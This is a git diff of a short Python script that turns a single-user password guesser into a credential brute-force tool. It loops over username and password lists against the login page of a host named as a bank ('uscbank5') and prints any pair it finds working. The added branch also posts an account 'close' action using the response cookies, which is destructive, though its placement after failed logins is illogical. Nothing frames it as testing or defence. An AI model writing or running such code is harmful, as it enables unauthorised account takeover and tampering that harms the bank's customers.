@@ -1,25 +1,21 @@
 import requests
 
-# Define the URL of the login page
-url = "http://example.com/login.php"
-
 # read passwords from file nord-pass.csv and store in list using comma delimiter
 with open('nord-pass.csv', 'r') as f:
     passwords = f.read().splitlines()
-            
 
-# Loop through each password and try to log in with it
-for password in passwords:
-    # Define the POST data for the login request
-    data = {
-        "username": "example_user",
-        "password": password
-    }
+with open('popular-usernames.csv', 'r') as f:
+    usernames = f.read().splitlines()
     
-    # Send the login request and check if it was successful
-    response = requests.post(url, data=data)
-    if "Invalid username or password" not in response.text:
-        print("Found weak password: " + password)
+for username in usernames:
+    for password in passwords:
+        url = 'https://uscbank5/login.php?user=' + username + '&pass=' + password
         
-        # success
-        
+        # Send the login request and check if it was successful
+        response = requests.post(url)
+        if "Invalid username or password" not in response.text:
+            print("Found weak username and password: " + username + " " + password)
+        else:
+            url_manage = 'https://uscbank5/manage.php?action=close'
+            r2 = requests.post(url_manage, cookies=response.cookies)
+            # success
